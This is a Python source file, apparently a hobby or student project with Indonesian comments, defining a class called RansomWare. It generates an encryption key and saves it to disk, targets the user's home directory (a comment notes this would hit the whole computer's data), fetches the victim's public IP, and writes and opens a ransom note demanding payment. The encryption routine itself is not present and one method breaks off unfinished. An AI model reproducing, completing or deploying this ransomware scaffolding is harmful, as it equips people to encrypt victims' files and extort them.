import os 
import webbrowser
import time
import subprocess
import base64
import ctypes
import requests
import urllib.request
import datetime
import win32gui

from cryptography.fernet import Fernet 
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from Crypto.Cipher import AES , PKCS1_OAEP

import threading


print(os.getcwd())
class RansomWare:
    
    file_extentions = ['txt']

    def __init__(self):
        self.key = None
        self.crypter = None #buat decrypt and encrypt
        self.public_key = None

        '''Ini kodingan jangan di buat aneh - aneh pak , pake folder yang udah w buat
        Jangan PAKE sysROot kalau gamau sistem ambyaar'''

        '''
            Sysroot digunakan untuk decrpty seluruh DATA KOMPUTER ( JANGAN YA Kalau ngga mau ambyarr)
            localroot digunakan untuk testing ya
        '''

        self.sysroot = os.path.expanduser('~')
        self.localroot = os.getcwd() +"/localRoot/"
        self.PublicIP = requests.get("https://api.ipify.org").text


    
    # Create Symmetric key on target machine for encrpyt and decrypt data

    def generate_symmetric_key(self):
        self.key = Fernet.generate_key()
        self.crypter = Fernet(self.key)
        print(self.key)
        print(self.crypter)

    def write_key(self):
        with(open ("fernet_key.txt","wb")) as fuf:
            fuf.write(self.key)

    def GivetheDeathNote(self):
        date = datetime.date.today().strftime("%d-%B-Y")
        with open("DeathNote.txt","w") as fuf:
            fuf.write(''' Yaudah Bayar ..... Ribet amat''')

    def ShowTheDeathNote(self):
        Notepad = subprocess.Popen(["notepad.exe","DeathNote.txt"])
        count = 0





if __name__ == "__main__":
    Virus = RansomWare()
    Virus.GivetheDeathNote()